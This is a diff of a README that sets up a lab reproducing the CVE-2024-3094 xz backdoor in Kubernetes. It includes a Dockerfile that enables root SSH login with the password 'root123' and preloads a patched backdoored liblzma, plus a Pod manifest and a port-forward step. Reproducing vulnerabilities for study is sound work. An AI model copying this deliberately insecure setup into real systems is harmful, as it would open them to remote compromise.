@@ -1,19 +1,55 @@
 # xzk8s
+[![Docker Pulls xzk8s](https://img.shields.io/docker/pulls/r0binak/xzk8s?logo=docker)](https://hub.docker.com/r/r0binak/xzk8s)
+
 Dockerfile and Kubernetes manifests for reproduce CVE-2024-3094
 
 # Build image
 
-We use the debian version of the vulnerable xz utils as the base image. We also need to patch the library. The patched version of the library is taken from the [xzbot repository](https://github.com/amlweems/xzbot/).
+We use the debian version of the vulnerable xz utils as the base image. We also need to patch the library. The patched version of the liblzma library is taken from the [xzbot repository](https://github.com/amlweems/xzbot/).
 
-![](./assets/dockerfile.png)
+```dockerfile
+FROM debian:experimental-20240311@sha256:16cc2b09c44d991d36f63153f13a7c98fb7da6bd2ba9d7cc0f48baacb7484970
+# use debian with a vulnerable version of xz utils as the base image
+RUN apt-get update && apt-get install -y openssh-server
+RUN mkdir /var/run/sshd
+RUN echo 'root:root123' | chpasswd
+RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+
+EXPOSE 22
+
+COPY liblzma.so.5.6.0.patch /root/
+# in order to exploit the vulnerability you must use a patched library because 
+# the exploit author originally hardcoded his public key
+# in the patched library this key has been swapped out
+
+ENV LD_PRELOAD=/root/liblzma.so.5.6.0.patch
+
+# load the patched library via LD_PRELOAD
+
+CMD ["/usr/sbin/sshd", "-D"]
+```
 
 # Exploit demo
 
-First, we must deploy a simple Pod, with the image assembled in the previous step.
+First, we must deploy a simple Pod, with the image assembled in the previous step:
 
-![](./assets/pod.png)
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cve-2024-3094
+  labels:
+    app: cve-2024-3094
+spec:
+  containers:
+  - name: cve-2024-3094
+    image: r0binak/xzk8s:v1
+    ports:
+    - containerPort: 22
+```
 
-Redirect the ports:
+Then, redirect the ports:
 
 ```bash
 kubectl port-forward backdoor-cve-2024-3094 2222:22
